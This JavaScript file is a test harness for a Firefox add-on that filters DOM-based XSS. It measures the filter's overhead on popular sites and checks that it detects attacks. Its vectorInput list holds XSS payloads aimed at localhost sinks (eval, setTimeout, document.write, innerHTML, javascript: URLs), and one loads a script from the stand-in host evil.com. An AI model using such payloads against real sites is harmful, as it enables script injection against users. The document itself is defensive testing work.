var prefs = require("sdk/preferences/service");
var system = require("sdk/system");
var timers = require("sdk/timers");
var self = require("sdk/self");


var {Navigator} = require("addon-navigate");

var vectorInput = [
  "http://localhost/dom-xss/test/examples/dombased.php?sink=eval#alert('xss');",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=function#alert('xss');",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=setTimeout#alert('xss');",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=scriptSrc#http://evil.com/xss.js",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=scriptText#alert(\"XSS\")",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=location#javascript:alert(\"XSS\")",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=lochref#javascript:alert(1)",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=docwrite#<script>alert(\"xss\")</script>",
  "http://localhost/dom-xss/test/examples/dombased.php?sink=innerHTML#<img src=\"http://sdfgofgd.net/\" onerror=\"alert(1)\">"
];

var benignInput = self.data.load("top5000.txt").split("\n").map(l => "http://www." + l.split(",")[1]);
benignInput = benignInput.slice(0,1);

function processHalf(h, ignoreFirst=0) {
  if (h.processed)
    return; // do not process twice
  h.processed = true;
  h.times = h.times.slice(ignoreFirst);
  if (h.times.length === 0)
    return;
  h.min = Math.min.apply(null, h.times);
  h.max = Math.max.apply(null, h.times);
  var sum = h.times.reduce((acc, cur) => acc + cur, 0);
  h.avg = Math.round(sum / h.times.length);
}

function processSite(s) {
  s.on && processHalf(s.on);
  s.off && processHalf(s.off);
  if (s.on && s.on.avg && s.off && s.off.avg)
    s.overhead = (s.on.avg - s.off.avg) / s.off.avg * 100;
}

var dxfHandler = {
  extraProperties: function(site) {
    site.on.attack = false;
    if (site.off)
      site.off.attack = false;
  },
  extraGlobals: function(w, cloneF) {
    w.onerror = msg => {
      if (msg.includes("DOM-Based XSS"))
        this.half.attack = true;
      else
        this.half.jsErrors.push(msg); // we could call the original handler
    };
  },
  extraPrefs: function() {
    prefs.set("security.dxf.enforce", true);
    prefs.set("security.dxf.minify", false);
  },
  turnOff: function() { 
    prefs.set("security.dxf.rewrite", false);
  },
  turnOn: function() {
    prefs.set("security.dxf.rewrite", true);
  },
  end: function() {
    this.sites.forEach(processSite);
    console.log("end", this.sites);
    // system.exit(0);
  }
};

var vectorHandler = {
  end: function() {
    dxfHandler.end.call(this);
    this.sites.forEach(s => { if (!s.on.attack) throw s.url });
    console.log("All attacks detected");
  }
};
vectorHandler.__proto__ = dxfHandler;

var benignHandler = {
  end: function() {
    dxfHandler.end.call(this);
    this.sites.forEach(function(site) {
      // check attack = false && msgs match
      if (site.on.attack === true || !msgMatch(site.on.jsErrors, site.off.jsErrors)) {
        debugger;
        console.log("Problem on site", site.url, site);
      }
    });
  }
};
benignHandler.__proto__ = dxfHandler;

var msgMatch = function(a, b) {
  a.sort();
  b.sort();
  return a.toString() === b.toString();
}

timers.setTimeout(function() {
  // var n = new Navigator(vectorInput, {times: 1}, vectorHandler);
  var n = new Navigator(benignInput, {times: 1, abTesting: true}, benignHandler);
  n.start();
}, 0.5 * 1000);